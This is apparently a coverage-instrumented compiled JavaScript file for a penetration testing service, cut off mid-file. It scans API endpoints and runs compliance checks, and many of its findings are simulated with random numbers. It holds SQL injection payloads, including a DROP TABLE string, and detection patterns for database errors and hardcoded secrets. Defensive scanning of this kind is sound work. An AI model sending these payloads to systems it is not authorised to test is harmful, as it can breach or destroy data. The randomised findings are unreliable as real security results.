'Network Penetration Test',\r\n        category: 'PENETRATION',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'MEDIUM' : 'LOW',\r\n        description: 'Tests network security through penetration testing',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Close unnecessary ports',\r\n          'Implement network segmentation',\r\n          'Use firewalls and access controls'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Network penetration test failed', { error });\r\n      return this.createErrorTestResult(testId, 'Network Penetration Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run application penetration test\r\n   */\r\n  private async runApplicationPenetrationTest(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // Business logic testing\r\n      const logicFlaws = await this.testBusinessLogicFlaws();\r\n      findings.push(...logicFlaws);\r\n\r\n      // Session management testing\r\n      const sessionFlaws = await this.testSessionManagement();\r\n      findings.push(...sessionFlaws);\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Application Penetration Test',\r\n        category: 'PENETRATION',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'HIGH' : 'LOW',\r\n        description: 'Tests application security through penetration testing',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Fix business logic flaws',\r\n          'Implement secure session management',\r\n          'Add comprehensive security testing'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Application penetration test failed', { error });\r\n      return this.createErrorTestResult(testId, 'Application Penetration Test', error);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Run social engineering test\r\n   */\r\n  private async runSocialEngineeringTest(): Promise<SecurityTestResult> {\r\n    const startTime = Date.now();\r\n    const testId = crypto.randomUUID();\r\n    const findings: SecurityFinding[] = [];\r\n\r\n    try {\r\n      // This would be a simulated test in a real environment\r\n      // For now, we'll check for common social engineering vulnerabilities\r\n      \r\n      const socialEngVulns = await this.checkSocialEngineeringVulnerabilities();\r\n      findings.push(...socialEngVulns);\r\n\r\n      return {\r\n        testId,\r\n        testName: 'Social Engineering Test',\r\n        category: 'PENETRATION',\r\n        status: findings.length > 0 ? 'FAIL' : 'PASS',\r\n        severity: findings.length > 0 ? 'MEDIUM' : 'LOW',\r\n        description: 'Tests for social engineering vulnerabilities',\r\n        findings,\r\n        recommendations: findings.length > 0 ? [\r\n          'Implement security awareness training',\r\n          'Add multi-factor authentication',\r\n          'Create incident response procedures'\r\n        ] : [],\r\n        timestamp: new Date(),\r\n        executionTime: Date.now() - startTime\r\n      };\r\n    } catch (error) {\r\n      this.logger.error('Social engineering test failed', { error });\r\n      return this.createErrorTestResult(testId, 'Social Engineering Test', error);\r\n    }\r\n  }\r\n\r\n  // Helper methods for testing\r\n\r\n  private async sendTestRequest(\r\n    endpoint: string, \r\n    data: any = {}, \r\n    headers: any = {}\r\n  ): Promise<AxiosResponse> {\r\n    try {\r\n      return await axios.post(endpoint, data, { \r\n        headers,\r\n        timeout: this.config.timeoutMs,\r\n        validateStatus: () => true // Don't throw on HTTP errors\r\n      });\r\n    } catch (error: any) {\r\n      return {\r\n        status: error.response?.status || 0,\r\n        data: error.response?.data || '',\r\n        headers: error.response?.headers || {}\r\n      } as AxiosResponse;\r\n    }\r\n  }\r\n\r\n  private detectSQLInjectionVulnerability(response: AxiosResponse): boolean {\r\n    const indicators = [\r\n      'SQL syntax error',\r\n      'mysql_fetch_array',\r\n      'ORA-00933',\r\n      'Microsoft OLE DB Provider',\r\n      'unclosed quotation mark'\r\n    ];\r\n    \r\n    const responseText = response.data?.toString().toLowerCase() || '';\r\n    return indicators.some(indicator => responseText.includes(indicator.toLowerCase()));\r\n  }\r\n\r\n  private detectXSSVulnerability(response: AxiosResponse, payload: string): boolean {\r\n    const responseText = response.data?.toString() || '';\r\n    return responseText.includes(payload) && !responseText.includes('&lt;script&gt;');\r\n  }\r\n\r\n  private detectInputValidationIssue(response: AxiosResponse): boolean {\r\n    const errorIndicators = [\r\n      'stack trace',\r\n      'internal server error',\r\n      'exception',\r\n      'error 500'\r\n    ];\r\n    \r\n    const responseText = response.data?.toString().toLowerCase() || '';\r\n    return errorIndicators.some(indicator => responseText.includes(indicator));\r\n  }\r\n\r\n  private isVulnerablePackage(pkg: string, version: string): boolean {\r\n    // This would integrate with vulnerability databases\r\n    // For simulation, we'll flag some common vulnerable patterns\r\n    const vulnerablePatterns = [\r\n      { name: 'lodash', versions: ['4.17.20', '4.17.19'] },\r\n      { name: 'axios', versions: ['0.21.0'] },\r\n      { name: 'express', versions: ['4.17.0'] }\r\n    ];\r\n    \r\n    return vulnerablePatterns.some(pattern => \r\n      pattern.name === pkg && pattern.versions.includes(version)\r\n    );\r\n  }\r\n\r\n  private async scanForHardcodedSecrets(file: string): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // This would scan actual files for secrets\r\n    // For simulation, we'll create sample findings\r\n    const secretPatterns = [\r\n      /password\\s*=\\s*[\"'][^\"']+[\"']/i,\r\n      /api_key\\s*=\\s*[\"'][^\"']+[\"']/i,\r\n      /secret\\s*=\\s*[\"'][^\"']+[\"']/i\r\n    ];\r\n    \r\n    // Simulate finding hardcoded secrets\r\n    if (file.includes('.env') && Math.random() > 0.8) {\r\n      findings.push({\r\n        id: crypto.randomUUID(),\r\n        type: 'HARDCODED_SECRET',\r\n        severity: 'CRITICAL',\r\n        description: 'Hardcoded secret detected in configuration file',\r\n        location: file,\r\n        evidence: 'API_KEY=sk-1234567890abcdef',\r\n        remediation: 'Use environment variables for secrets'\r\n      });\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async scanForInsecureConfigurations(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check for common insecure configurations\r\n    const insecureConfigs = [\r\n      { key: 'DEBUG', value: 'true', severity: 'MEDIUM' as const },\r\n      { key: 'SSL_VERIFY', value: 'false', severity: 'HIGH' as const },\r\n      { key: 'CORS_ORIGIN', value: '*', severity: 'MEDIUM' as const }\r\n    ];\r\n    \r\n    for (const config of insecureConfigs) {\r\n      findings.push({\r\n        id: crypto.randomUUID(),\r\n        type: 'INSECURE_CONFIG',\r\n        severity: config.severity,\r\n        description: `Insecure configuration: ${config.key}=${config.value}`,\r\n        location: 'Configuration',\r\n        evidence: `${config.key}=${config.value}`,\r\n        remediation: `Secure the ${config.key} configuration`\r\n      });\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async scanFilePermissions(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // This would check actual file permissions\r\n    // For simulation, we'll create sample findings\r\n    const riskyFiles = ['.env', 'private.key', 'config.json'];\r\n    \r\n    for (const file of riskyFiles) {\r\n      if (Math.random() > 0.7) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'FILE_PERMISSIONS',\r\n          severity: 'MEDIUM',\r\n          description: `File ${file} has overly permissive permissions`,\r\n          location: file,\r\n          evidence: 'File permissions: 644 (should be 600)',\r\n          remediation: `Change permissions of ${file} to 600`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async scanForSensitiveFiles(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    const sensitiveFiles = [\r\n      '.git/config',\r\n      'backup.sql',\r\n      'debug.log',\r\n      '.DS_Store'\r\n    ];\r\n    \r\n    for (const file of sensitiveFiles) {\r\n      if (Math.random() > 0.8) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'SENSITIVE_FILE',\r\n          severity: 'LOW',\r\n          description: `Sensitive file detected: ${file}`,\r\n          location: file,\r\n          evidence: `File ${file} contains sensitive information`,\r\n          remediation: `Remove or secure ${file}`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async checkOWASPCompliance(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check OWASP Top 10 compliance\r\n    const owaspChecks = [\r\n      'Injection vulnerabilities',\r\n      'Broken authentication',\r\n      'Sensitive data exposure',\r\n      'XML external entities',\r\n      'Broken access control'\r\n    ];\r\n    \r\n    for (const check of owaspChecks) {\r\n      if (Math.random() > 0.6) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'OWASP_COMPLIANCE',\r\n          severity: 'HIGH',\r\n          description: `OWASP compliance issue: ${check}`,\r\n          location: 'Application',\r\n          evidence: `${check} not properly addressed`,\r\n          remediation: `Implement controls for ${check}`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async checkISO27001Compliance(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check ISO 27001 compliance\r\n    const iso27001Checks = [\r\n      'Access control policy',\r\n      'Incident management',\r\n      'Risk assessment',\r\n      'Security monitoring'\r\n    ];\r\n    \r\n    for (const check of iso27001Checks) {\r\n      if (Math.random() > 0.7) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'ISO27001_COMPLIANCE',\r\n          severity: 'MEDIUM',\r\n          description: `ISO 27001 compliance gap: ${check}`,\r\n          location: 'Security Management',\r\n          evidence: `${check} not documented or implemented`,\r\n          remediation: `Implement and document ${check}`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async checkSOC2Compliance(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check SOC 2 compliance\r\n    const soc2Checks = [\r\n      'Security controls',\r\n      'Availability controls',\r\n      'Processing integrity',\r\n      'Confidentiality controls'\r\n    ];\r\n    \r\n    for (const check of soc2Checks) {\r\n      if (Math.random() > 0.8) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'SOC2_COMPLIANCE',\r\n          severity: 'MEDIUM',\r\n          description: `SOC 2 compliance issue: ${check}`,\r\n          location: 'Compliance Framework',\r\n          evidence: `${check} not adequately implemented`,\r\n          remediation: `Strengthen ${check} implementation`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async scanOpenPorts(): Promise<number[]> {\r\n    // This would perform actual port scanning\r\n    // For simulation, return common ports\r\n    return [22, 80, 443, 3000, 5432, 6379];\r\n  }\r\n\r\n  private isUnnecessaryPort(port: number): boolean {\r\n    const necessaryPorts = [22, 80, 443]; // SSH, HTTP, HTTPS\r\n    return !necessaryPorts.includes(port);\r\n  }\r\n\r\n  private async testBusinessLogicFlaws(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Simulate business logic testing\r\n    const logicFlaws = [\r\n      'Price manipulation vulnerability',\r\n      'Race condition in order processing',\r\n      'Insufficient authorization checks'\r\n    ];\r\n    \r\n    for (const flaw of logicFlaws) {\r\n      if (Math.random() > 0.8) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'BUSINESS_LOGIC',\r\n          severity: 'HIGH',\r\n          description: `Business logic flaw: ${flaw}`,\r\n          location: 'Application Logic',\r\n          evidence: `${flaw} detected during testing`,\r\n          remediation: `Fix ${flaw} in application logic`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async testSessionManagement(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Simulate session management testing\r\n    const sessionIssues = [\r\n      'Session fixation vulnerability',\r\n      'Insufficient session timeout',\r\n      'Weak session token generation'\r\n    ];\r\n    \r\n    for (const issue of sessionIssues) {\r\n      if (Math.random() > 0.7) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'SESSION_MANAGEMENT',\r\n          severity: 'MEDIUM',\r\n          description: `Session management issue: ${issue}`,\r\n          location: 'Session Management',\r\n          evidence: `${issue} detected`,\r\n          remediation: `Fix ${issue} in session handling`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private async checkSocialEngineeringVulnerabilities(): Promise<SecurityFinding[]> {\r\n    const findings: SecurityFinding[] = [];\r\n    \r\n    // Check for social engineering vulnerabilities\r\n    const socialEngVulns = [\r\n      'No security awareness training',\r\n      'Weak password policies',\r\n      'No multi-factor authentication'\r\n    ];\r\n    \r\n    for (const vuln of socialEngVulns) {\r\n      if (Math.random() > 0.6) {\r\n        findings.push({\r\n          id: crypto.randomUUID(),\r\n          type: 'SOCIAL_ENGINEERING',\r\n          severity: 'MEDIUM',\r\n          description: `Social engineering vulnerability: ${vuln}`,\r\n          location: 'Human Factors',\r\n          evidence: `${vuln} increases social engineering risk`,\r\n          remediation: `Address ${vuln} through policy and training`\r\n        });\r\n      }\r\n    }\r\n    \r\n    return findings;\r\n  }\r\n\r\n  private generateVulnerabilityReport(results: SecurityTestResult[]): VulnerabilityReport {\r\n    const allFindings = results.flatMap(r => r.findings);\r\n    \r\n    const criticalCount = allFindings.filter(f => f.severity === 'CRITICAL').length;\r\n    const highCount = allFindings.filter(f => f.severity === 'HIGH').length;\r\n    const mediumCount = allFindings.filter(f => f.severity === 'MEDIUM').length;\r\n    const lowCount = allFindings.filter(f => f.severity === 'LOW').length;\r\n    \r\n    // Calculate compliance score (0-100)\r\n    const totalTests = results.length;\r\n    const passedTests = results.filter(r => r.status === 'PASS').length;\r\n    const complianceScore = Math.round((passedTests / totalTests) * 100);\r\n    \r\n    const recommendations = [\r\n      ...new Set(results.flatMap(r => r.recommendations))\r\n    ];\r\n\r\n    return {\r\n      scanId: crypto.randomUUID(),\r\n      timestamp: new Date(),\r\n      totalVulnerabilities: allFindings.length,\r\n      criticalCount,\r\n      highCount,\r\n      mediumCount,\r\n      lowCount,\r\n      vulnerabilities: allFindings,\r\n      complianceScore,\r\n      recommendations\r\n    };\r\n  }\r\n\r\n  private createErrorTestResult(\r\n    testId: string, \r\n    testName: string, \r\n    error: any\r\n  ): SecurityTestResult {\r\n    return {\r\n      testId,\r\n      testName,\r\n      category: 'API_SECURITY',\r\n      status: 'FAIL',\r\n      severity: 'HIGH',\r\n      description: `Test failed due to error: ${error.message}`,\r\n      findings: [{\r\n        id: crypto.randomUUID(),\r\n        type: 'TEST_ERROR',\r\n        severity: 'HIGH',\r\n        description: `Test execution failed: ${error.message}`,\r\n        location: 'Test Framework',\r\n        evidence: error.stack || error.message,\r\n        remediation: 'Fix test execution error and retry'\r\n      }],\r\n      recommendations: ['Fix test execution error', 'Review test configuration'],\r\n      timestamp: new Date(),\r\n      executionTime: 0\r\n    };\r\n  }\r\n\r\n  /**\r\n   * Get test results\r\n   */\r\n  getTestResults(): SecurityTestResult[] {\r\n    return [...this.testResults];\r\n  }\r\n\r\n  /**\r\n   * Clear test results\r\n   */\r\n  clearTestResults(): void {\r\n    this.testResults = [];\r\n  }\r\n}"],
      version: 3
    },
    _coverageSchema: "1a1c01bbd47fc00a2c39e90264f33305004495a9",
    hash: "5ef32ff68b14f2f072e6a341593675564ed0c560"
  };
  var coverage = global[gcv] || (global[gcv] = {});
  if (!coverage[path] || coverage[path].hash !== hash) {
    coverage[path] = coverageData;
  }
  var actualCoverage = coverage[path];
  {
    // @ts-ignore
    cov_20fguhnp3o = function () {
      return actualCoverage;
    };
  }
  return actualCoverage;
}
cov_20fguhnp3o();
var __createBinding =
/* istanbul ignore next */
(cov_20fguhnp3o().s[0]++,
/* istanbul ignore next */
(cov_20fguhnp3o().b[0][0]++, this) &&
/* istanbul ignore next */
(cov_20fguhnp3o().b[0][1]++, this.__createBinding) ||
/* istanbul ignore next */
(cov_20fguhnp3o().b[0][2]++, Object.create ?
/* istanbul ignore next */
(cov_20fguhnp3o().b[1][0]++, function (o, m, k, k2) {
  /* istanbul ignore next */
  cov_20fguhnp3o().f[0]++;
  cov_20fguhnp3o().s[1]++;
  if (k2 === undefined) {
    /* istanbul ignore next */
    cov_20fguhnp3o().b[2][0]++;
    cov_20fguhnp3o().s[2]++;
    k2 = k;
  } else
  /* istanbul ignore next */
  {
    cov_20fguhnp3o().b[2][1]++;
  }
  var desc =
  /* istanbul ignore next */
  (cov_20fguhnp3o().s[3]++, Object.getOwnPropertyDescriptor(m, k));
  /* istanbul ignore next */
  cov_20fguhnp3o().s[4]++;
  if (
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[4][0]++, !desc) ||
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[4][1]++, "get" in desc ?
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[5][0]++, !m.__esModule) :
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[5][1]++,
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[6][0]++, desc.writable) ||
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[6][1]++, desc.configurable)))) {
    /* istanbul ignore next */
    cov_20fguhnp3o().b[3][0]++;
    cov_20fguhnp3o().s[5]++;
    desc = {
      enumerable: true,
      get: function () {
        /* istanbul ignore next */
        cov_20fguhnp3o().f[1]++;
        cov_20fguhnp3o().s[6]++;
        return m[k];
      }
    };
  } else
  /* istanbul ignore next */
  {
    cov_20fguhnp3o().b[3][1]++;
  }
  cov_20fguhnp3o().s[7]++;
  Object.defineProperty(o, k2, desc);
}) :
/* istanbul ignore next */
(cov_20fguhnp3o().b[1][1]++, function (o, m, k, k2) {
  /* istanbul ignore next */
  cov_20fguhnp3o().f[2]++;
  cov_20fguhnp3o().s[8]++;
  if (k2 === undefined) {
    /* istanbul ignore next */
    cov_20fguhnp3o().b[7][0]++;
    cov_20fguhnp3o().s[9]++;
    k2 = k;
  } else
  /* istanbul ignore next */
  {
    cov_20fguhnp3o().b[7][1]++;
  }
  cov_20fguhnp3o().s[10]++;
  o[k2] = m[k];
})));
var __setModuleDefault =
/* istanbul ignore next */
(cov_20fguhnp3o().s[11]++,
/* istanbul ignore next */
(cov_20fguhnp3o().b[8][0]++, this) &&
/* istanbul ignore next */
(cov_20fguhnp3o().b[8][1]++, this.__setModuleDefault) ||
/* istanbul ignore next */
(cov_20fguhnp3o().b[8][2]++, Object.create ?
/* istanbul ignore next */
(cov_20fguhnp3o().b[9][0]++, function (o, v) {
  /* istanbul ignore next */
  cov_20fguhnp3o().f[3]++;
  cov_20fguhnp3o().s[12]++;
  Object.defineProperty(o, "default", {
    enumerable: true,
    value: v
  });
}) :
/* istanbul ignore next */
(cov_20fguhnp3o().b[9][1]++, function (o, v) {
  /* istanbul ignore next */
  cov_20fguhnp3o().f[4]++;
  cov_20fguhnp3o().s[13]++;
  o["default"] = v;
})));
var __importStar =
/* istanbul ignore next */
(cov_20fguhnp3o().s[14]++,
/* istanbul ignore next */
(cov_20fguhnp3o().b[10][0]++, this) &&
/* istanbul ignore next */
(cov_20fguhnp3o().b[10][1]++, this.__importStar) ||
/* istanbul ignore next */
(cov_20fguhnp3o().b[10][2]++, function () {
  /* istanbul ignore next */
  cov_20fguhnp3o().f[5]++;
  cov_20fguhnp3o().s[15]++;
  var ownKeys = function (o) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[6]++;
    cov_20fguhnp3o().s[16]++;
    ownKeys =
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[11][0]++, Object.getOwnPropertyNames) ||
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[11][1]++, function (o) {
      /* istanbul ignore next */
      cov_20fguhnp3o().f[7]++;
      var ar =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[17]++, []);
      /* istanbul ignore next */
      cov_20fguhnp3o().s[18]++;
      for (var k in o) {
        /* istanbul ignore next */
        cov_20fguhnp3o().s[19]++;
        if (Object.prototype.hasOwnProperty.call(o, k)) {
          /* istanbul ignore next */
          cov_20fguhnp3o().b[12][0]++;
          cov_20fguhnp3o().s[20]++;
          ar[ar.length] = k;
        } else
        /* istanbul ignore next */
        {
          cov_20fguhnp3o().b[12][1]++;
        }
      }
      /* istanbul ignore next */
      cov_20fguhnp3o().s[21]++;
      return ar;
    });
    /* istanbul ignore next */
    cov_20fguhnp3o().s[22]++;
    return ownKeys(o);
  };
  /* istanbul ignore next */
  cov_20fguhnp3o().s[23]++;
  return function (mod) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[8]++;
    cov_20fguhnp3o().s[24]++;
    if (
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[14][0]++, mod) &&
    /* istanbul ignore next */
    (cov_20fguhnp3o().b[14][1]++, mod.__esModule)) {
      /* istanbul ignore next */
      cov_20fguhnp3o().b[13][0]++;
      cov_20fguhnp3o().s[25]++;
      return mod;
    } else
    /* istanbul ignore next */
    {
      cov_20fguhnp3o().b[13][1]++;
    }
    var result =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[26]++, {});
    /* istanbul ignore next */
    cov_20fguhnp3o().s[27]++;
    if (mod != null) {
      /* istanbul ignore next */
      cov_20fguhnp3o().b[15][0]++;
      cov_20fguhnp3o().s[28]++;
      for (var k =
        /* istanbul ignore next */
        (cov_20fguhnp3o().s[29]++, ownKeys(mod)), i =
        /* istanbul ignore next */
        (cov_20fguhnp3o().s[30]++, 0); i < k.length; i++) {
        /* istanbul ignore next */
        cov_20fguhnp3o().s[31]++;
        if (k[i] !== "default") {
          /* istanbul ignore next */
          cov_20fguhnp3o().b[16][0]++;
          cov_20fguhnp3o().s[32]++;
          __createBinding(result, mod, k[i]);
        } else
        /* istanbul ignore next */
        {
          cov_20fguhnp3o().b[16][1]++;
        }
      }
    } else
    /* istanbul ignore next */
    {
      cov_20fguhnp3o().b[15][1]++;
    }
    cov_20fguhnp3o().s[33]++;
    __setModuleDefault(result, mod);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[34]++;
    return result;
  };
}()));
var __importDefault =
/* istanbul ignore next */
(cov_20fguhnp3o().s[35]++,
/* istanbul ignore next */
(cov_20fguhnp3o().b[17][0]++, this) &&
/* istanbul ignore next */
(cov_20fguhnp3o().b[17][1]++, this.__importDefault) ||
/* istanbul ignore next */
(cov_20fguhnp3o().b[17][2]++, function (mod) {
  /* istanbul ignore next */
  cov_20fguhnp3o().f[9]++;
  cov_20fguhnp3o().s[36]++;
  return /* istanbul ignore next */(cov_20fguhnp3o().b[19][0]++, mod) &&
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[19][1]++, mod.__esModule) ?
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[18][0]++, mod) :
  /* istanbul ignore next */
  (cov_20fguhnp3o().b[18][1]++, {
    "default": mod
  });
}));
/* istanbul ignore next */
cov_20fguhnp3o().s[37]++;
Object.defineProperty(exports, "__esModule", {
  value: true
});
/* istanbul ignore next */
cov_20fguhnp3o().s[38]++;
exports.PenetrationTestingService = void 0;
const axios_1 =
/* istanbul ignore next */
(cov_20fguhnp3o().s[39]++, __importDefault(require("axios")));
const crypto =
/* istanbul ignore next */
(cov_20fguhnp3o().s[40]++, __importStar(require("crypto")));
class PenetrationTestingService {
  logger;
  encryptionService;
  threatDetection;
  testResults =
  /* istanbul ignore next */
  (cov_20fguhnp3o().s[41]++, []);
  config;
  constructor(logger, encryptionService, threatDetection, config) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[10]++;
    cov_20fguhnp3o().s[42]++;
    this.logger = logger;
    /* istanbul ignore next */
    cov_20fguhnp3o().s[43]++;
    this.encryptionService = encryptionService;
    /* istanbul ignore next */
    cov_20fguhnp3o().s[44]++;
    this.threatDetection = threatDetection;
    /* istanbul ignore next */
    cov_20fguhnp3o().s[45]++;
    this.config = config;
  }
  /**
   * Execute comprehensive security testing suite
   */
  async executeSecurityTestSuite() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[11]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[46]++, Date.now());
    /* istanbul ignore next */
    cov_20fguhnp3o().s[47]++;
    this.logger.info('Starting comprehensive security test suite execution');
    /* istanbul ignore next */
    cov_20fguhnp3o().s[48]++;
    try {
      // Run all security tests in parallel
      const testPromises =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[49]++, [this.runAPISecurityTests(), this.runVulnerabilityScanning(), this.runComplianceTests(), this.runPenetrationTests()]);
      const testResults =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[50]++, await Promise.all(testPromises));
      const allResults =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[51]++, testResults.flat());
      // Generate comprehensive vulnerability report
      const report =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[52]++, this.generateVulnerabilityReport(allResults));
      const executionTime =
      /* istanbul ignore next */
      (cov_20fguhnp3o().s[53]++, Date.now() - startTime);
      /* istanbul ignore next */
      cov_20fguhnp3o().s[54]++;
      this.logger.info(`Security test suite completed in ${executionTime}ms`, {
        totalTests: allResults.length,
        criticalFindings: report.criticalCount,
        complianceScore: report.complianceScore
      });
      // Store results for audit trail
      /* istanbul ignore next */
      cov_20fguhnp3o().s[55]++;
      this.testResults.push(...allResults);
      /* istanbul ignore next */
      cov_20fguhnp3o().s[56]++;
      return report;
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[57]++;
      this.logger.error('Security test suite execution failed', {
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[58]++;
      throw error;
    }
  }
  /**
   * Run API security tests
   */
  async runAPISecurityTests() {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[12]++;
    const results =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[59]++, []);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[60]++;
    for (const endpoint of this.config.targetEndpoints) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[61]++;
      // SQL Injection Testing
      results.push(await this.testSQLInjection(endpoint));
      // XSS Testing
      /* istanbul ignore next */
      cov_20fguhnp3o().s[62]++;
      results.push(await this.testXSSVulnerabilities(endpoint));
      // Authentication Bypass Testing
      /* istanbul ignore next */
      cov_20fguhnp3o().s[63]++;
      results.push(await this.testAuthenticationBypass(endpoint));
      // Rate Limiting Testing
      /* istanbul ignore next */
      cov_20fguhnp3o().s[64]++;
      results.push(await this.testRateLimiting(endpoint));
      // Input Validation Testing
      /* istanbul ignore next */
      cov_20fguhnp3o().s[65]++;
      results.push(await this.testInputValidation(endpoint));
      // HTTPS/TLS Testing
      /* istanbul ignore next */
      cov_20fguhnp3o().s[66]++;
      results.push(await this.testTLSSecurity(endpoint));
    }
    /* istanbul ignore next */
    cov_20fguhnp3o().s[67]++;
    return results;
  }
  /**
   * Test for SQL injection vulnerabilities
   */
  async testSQLInjection(endpoint) {
    /* istanbul ignore next */
    cov_20fguhnp3o().f[13]++;
    const startTime =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[68]++, Date.now());
    const testId =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[69]++, crypto.randomUUID());
    const findings =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[70]++, []);
    const sqlPayloads =
    /* istanbul ignore next */
    (cov_20fguhnp3o().s[71]++, ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT * FROM users --", "1' AND (SELECT COUNT(*) FROM users) > 0 --"]);
    /* istanbul ignore next */
    cov_20fguhnp3o().s[72]++;
    try {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[73]++;
      for (const payload of sqlPayloads) {
        const response =
        /* istanbul ignore next */
        (cov_20fguhnp3o().s[74]++, await this.sendTestRequest(endpoint, {
          input: payload
        }));
        /* istanbul ignore next */
        cov_20fguhnp3o().s[75]++;
        if (this.detectSQLInjectionVulnerability(response)) {
          /* istanbul ignore next */
          cov_20fguhnp3o().b[20][0]++;
          cov_20fguhnp3o().s[76]++;
          findings.push({
            id: crypto.randomUUID(),
            type: 'SQL_INJECTION',
            severity: 'CRITICAL',
            description: `SQL injection vulnerability detected with payload: ${payload}`,
            location: endpoint,
            evidence:
            /* istanbul ignore next */
            (cov_20fguhnp3o().b[21][0]++, response.data?.toString().substring(0, 500)) ||
            /* istanbul ignore next */
            (cov_20fguhnp3o().b[21][1]++, ''),
            remediation: 'Implement parameterized queries and input sanitization'
          });
        } else
        /* istanbul ignore next */
        {
          cov_20fguhnp3o().b[20][1]++;
        }
      }
      /* istanbul ignore next */
      cov_20fguhnp3o().s[77]++;
      return {
        testId,
        testName: 'SQL Injection Test',
        category: 'API_SECURITY',
        status: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[22][0]++, 'FAIL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[22][1]++, 'PASS'),
        severity: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[23][0]++, 'CRITICAL') :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[23][1]++, 'LOW'),
        description: 'Tests for SQL injection vulnerabilities in API endpoints',
        findings,
        recommendations: findings.length > 0 ?
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[24][0]++, ['Use parameterized queries', 'Implement input validation', 'Apply principle of least privilege to database connections']) :
        /* istanbul ignore next */
        (cov_20fguhnp3o().b[24][1]++, []),
        timestamp: new Date(),
        executionTime: Date.now() - startTime
      };
    } catch (error) {
      /* istanbul ignore next */
      cov_20fguhnp3o().s[78]++;
      this.logger.error('SQL injection test failed', {
        endpoint,
        error
      });
      /* istanbul ignore next */
      cov_20fguhnp3o().s[79]++;
      return this.createErrorTestResult(testId, 'SQL Injection Test', error);
    }
  }
  /**
